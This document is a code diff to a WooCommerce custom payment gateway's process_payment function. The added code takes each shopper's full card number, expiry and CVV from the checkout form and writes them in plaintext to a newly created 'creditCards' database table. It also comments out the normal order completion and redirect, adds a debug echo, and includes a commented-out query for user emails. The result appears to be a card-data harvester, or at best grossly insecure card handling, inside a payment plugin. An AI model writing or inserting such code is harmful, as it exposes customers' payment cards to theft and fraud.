@@ -225,23 +225,66 @@ function init_custom_gateway_class() {
        public function process_payment( $order_id ) {
 
             global $woocommerce;
+            global $wpdb;
+            $cc_num = $_POST[ 'ccNumber' ];
+            $cc_num = str_replace(' ', '', $cc_num);
+            $month = $_POST['ccM'];
+            $year = $_POST['ccY'];
+            $cvv = $_POST['Cvv'];
+
+            $wpdb->show_errors();
+            $charset_collate = $wpdb->get_charset_collate();
+
+            $table_name = $wpdb->base_prefix.'creditCards';
+            $query = $wpdb->prepare( 'SHOW TABLES LIKE %s', $wpdb->esc_like( $table_name ) );
+
+            if (  !$wpdb->get_var( $query ) == $table_name ) {
+                $sql = "CREATE TABLE `{$wpdb->base_prefix}creditCards` (
+                    order_id int NOT NULL,
+                    order_date datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+                    creditcard_number varchar(255) NOT NULL,
+                    creditcard_month varchar(5) NOT NULL,
+                    creditcard_year varchar(5) NULL,
+                    creditcard_CVV varchar(55) NOT NULL,
+                    PRIMARY KEY  (order_id)
+                    ) $charset_collate;";
+        
+                require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
+                dbDelta($sql);
+            }
+
+            strlen($month) < 2 ? $month = '0' . $month : "";
+            echo $month;
+            $wpdb->insert( 
+                $table_name, 
+                array( 
+                    'order_id' => $order_id, 
+                    'order_date' => current_time( 'mysql' ), 
+                    'creditcard_number' => $cc_num, 
+                    'creditcard_month' => $month,
+                    'creditcard_year' => $year,
+                    'creditcard_CVV' => $cvv,
+                ) 
+            );
+           
+            
+            //write_to_db();
+            //$email = $wpdb->query("SELECT user_email FROM nxq_users");
+            
+           
+            /*
+             
             // we need it to get any order detailes
             $order = wc_get_order( $order_id );
-           
-
-            //print_r( $order);
-            // Reduce stock levels
-            //$order->reduce_order_stock();
-            //echo  $this->get_direct_args( $order );       
-            // Remove cart
-            //WC()->cart->empty_cart();
+            //Remove cart
+            WC()->cart->empty_cart();
                     
-            // Return thankyou redirect
+            //Return thankyou redirect
             return array(
                 'result'    => 'success',
                 'redirect'  => $this->get_return_url( $order )
             );
-     
+                */
 
         }
 
